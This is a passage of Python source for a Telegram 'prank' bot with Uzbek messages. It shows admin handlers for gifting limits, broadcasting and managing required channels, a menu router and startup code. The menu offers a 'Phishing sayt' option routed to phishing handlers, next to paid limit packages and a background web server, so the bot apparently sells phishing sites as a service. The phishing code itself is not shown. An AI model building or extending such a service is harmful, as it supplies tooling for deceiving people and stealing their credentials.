async def admin_gift_user_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text
    user = None
    if target.isdigit():
        user = await get_user(int(target))
    else:
        user = await get_user_by_username(target)
    
    if not user:
        await update.message.reply_text("❌ Foydalanuvchi topilmadi! Qaytadan urinib ko'ring yoki /cancel deb yozing.")
        return ADMIN_GIFT_USER
    
    context.user_data['gift_target_id'] = user['user_id']
    await update.message.reply_text(f"👤 Foydalanuvchi: {user['first_name']} (@{user['username'] or 'yo\'q'})\nNechta limit hadya qilmoqchisiz?")
    return ADMIN_GIFT_AMOUNT

async def admin_gift_amount_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount = update.message.text
    if not amount.isdigit():
        await update.message.reply_text("❌ Son kiriting!")
        return ADMIN_GIFT_AMOUNT
    
    user_id = context.user_data.pop('gift_target_id', None)
    if user_id:
        await add_limits(user_id, int(amount))
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🎁 Admin sizga <b>{amount}</b> ta limit hadya qildi!\nPrank qilishdan to'xtamang! 😂",
                parse_mode='HTML'
            )
        except: pass
        await update.message.reply_text(f"✅ {amount} ta limit muvaffaqiyatli hadya qilindi.")
    
    return await show_admin_main(update, context)

async def admin_broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle broadcast message with optional image and link."""
    text = ""
    link = None
    photo_id = None
    
    if update.message.photo:
        photo_id = update.message.photo[-1].file_id
        text = update.message.caption or ""
    else:
        text = update.message.text or ""
    
    if " | " in text:
        text, link = text.split(" | ", 1)
        link = link.strip()
    
    if not text and not photo_id:
        await update.message.reply_text("❌ Matn yoki rasm yuboring!")
        return ADMIN_BROADCAST_MSG
    
    users = await get_all_users()
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(f"📢 Yuborilmoqda... 0/{len(users)}")
    
    keyboard = None
    if link:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Batafsil", url=link)]])
    
    for uid in users:
        try:
            if photo_id:
                await context.bot.send_photo(chat_id=uid, photo=photo_id, caption=text, reply_markup=keyboard, parse_mode='HTML')
            else:
                await context.bot.send_message(chat_id=uid, text=text, reply_markup=keyboard, parse_mode='HTML')
            sent += 1
        except:
            failed += 1
        
        if (sent + failed) % 20 == 0:
            try: await status_msg.edit_text(f"📢 Yuborilmoqda... {sent + failed}/{len(users)}")
            except: pass
        await asyncio.sleep(0.05) # Avoid flood
    
    await status_msg.edit_text(f"✅ <b>Tugadi!</b>\n\n📤 Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')
    return await show_admin_main(update, context)

async def admin_add_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle adding a required channel."""
    channel_input = update.message.text.strip()
    if not channel_input:
        await update.message.reply_text("❌ Kanal username sini kiriting!")
        return ADMIN_ADD_CHANNEL
    
    if not channel_input.startswith('@'):
        channel_input = '@' + channel_input
    
    # Try to get channel info
    try:
        chat = await context.bot.get_chat(channel_input)
        channel_title = chat.title or channel_input
    except Exception:
        channel_title = channel_input
    
    success = await add_required_channel(channel_input, channel_title)
    if success:
        await update.message.reply_text(
            f"✅ <b>{channel_title}</b> ({channel_input}) majburiy obunaga qo'shildi!",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"⚠️ Bu kanal allaqachon ro'yxatda mavjud!",
            parse_mode='HTML'
        )
    return await show_admin_main(update, context)


async def admin_remove_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle removing a required channel."""
    channel_input = update.message.text.strip()
    if not channel_input:
        await update.message.reply_text("❌ Kanal username sini kiriting!")
        return ADMIN_REMOVE_CHANNEL
    
    success = await remove_required_channel(channel_input)
    if success:
        await update.message.reply_text(
            f"✅ <b>{channel_input}</b> majburiy obunadan o'chirildi!",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"❌ Bu kanal topilmadi!",
            parse_mode='HTML'
        )
    return await show_admin_main(update, context)


async def cancel_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Bekor qilindi.")
    return ConversationHandler.END

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages including button presses."""
    text = update.message.text

    # Handle menu button presses
    if text == "🎭 Prank yuborish":
        await prank_menu(update, context)
    elif text == "🌐 Phishing sayt":
        await phishing_menu(update, context)
    elif text == "🖼 Rasm effektlari":
        await effects_menu(update, context)
    elif text == "👤 Profilim":
        await profile_command(update, context)
    elif text == "🔗 Referal":
        await referral_command(update, context)
    elif text == "💰 Limit sotib olish":
        await buy_limits_menu(update, context)
    elif text == "📊 Statistika":
        await stats_command(update, context)
    elif text == "ℹ️ Yordam":
        await help_command(update, context)
    else:
        # Check if user has a selected package (might be sending receipt as document)
        if context.user_data.get(SELECTED_PACKAGE):
            await update.message.reply_text(
                "📸 Iltimos, to'lov <b>chekini rasm</b> sifatida yuboring!",
                parse_mode='HTML'
            )



async def handle_document_or_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document or photo messages."""
    user_id = update.effective_user.id
    
    # If user has selected a package, treat as receipt
    if context.user_data.get(SELECTED_PACKAGE):
        await handle_receipt(update, context)
        return
    
    # If user has selected an effect and sent a photo
    if context.user_data.get(SELECTED_EFFECT) and update.message.photo:
        await handle_photo(update, context)
        return
    
    # Default: treat photos as effect requests
    if update.message.photo:
        await handle_photo(update, context)


# ============================================================
# MAIN
# ============================================================

async def post_init(app: Application):
    """Post-initialization hook."""
    await init_db()
    # Start web server in the background
    asyncio.create_task(start_web_server())
    logger.info("✅ Database and Web Server initialized")


def main():
    """Start the bot."""
    if not BOT_TOKEN or BOT_TOKEN == 'your_bot_token_here':
        print("❌ BOT_TOKEN ni .env faylida sozlang!")
        print("📋 .env.example faylini .env ga nusxalab, sozlamalarni kiriting.")
        return

    print("🤖 Prank Bot ishga tushmoqda...")

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Admin Conversation
    admin_handler = ConversationHandler(
        entry_points=[CommandHandler("admin", admin_start)],
        states={
            ADMIN_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_password_handler)],
            ADMIN_MAIN: [CallbackQueryHandler(admin_menu_callback)],
            ADMIN_SET_REFERRAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_ref_handler)],
            ADMIN_SET_DAILY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_set_daily_handler)],
            ADMIN_GIFT_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_gift_user_handler)],
            ADMIN_GIFT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_gift_amount_handler)],
            ADMIN_BROADCAST_MSG: [
                MessageHandler(filters.TEXT | filters.PHOTO | filters.CAPTION, admin_broadcast_handler)
            ],
            ADMIN_ADD_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_channel_handler)],
            ADMIN_REMOVE_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_remove_channel_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel_admin)]
    )
    app.add_handler(admin_handler)

    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("profile", profile_command))
    app.add_handler(CommandHandler("referral", referral_command))
    app.add_handler(CommandHandler("buy", buy_limits_menu))

    # Legacy Admin commands (Optional: keep for quick access if already authenticated, 
    # but ConversationHandler is safer. Removing for simplicity as requested per panel.)
    # app.add_handler(CommandHandler("pending", pending_payments)) 

    # Callback query handlers
    app.add_handler(CallbackQueryHandler(check_sub_callback, pattern=r'^check_sub$'))
    app.add_handler(CallbackQueryHandler(prank_callback, pattern=r'^prank_'))
    app.add_handler(CallbackQueryHandler(phishing_callback, pattern=r'^phish_'))
    app.add_handler(CallbackQueryHandler(effect_callback, pattern=r'^effect_'))
    app.add_handler(CallbackQueryHandler(buy_callback, pattern=r'^buy_'))
    app.add_handler(CallbackQueryHandler(approve_callback, pattern=r'^approve_'))
    app.add_handler(CallbackQueryHandler(reject_callback, pattern=r'^reject_'))

    # Message handlers
    app.add_handler(MessageHandler(filters.PHOTO, handle_document_or_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document_or_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    print("✅ Bot tayyor! Ishga tushirilmoqda...")
    app.run_polling(drop_pending_updates=True)


if __name__ == '__main__':
    main()

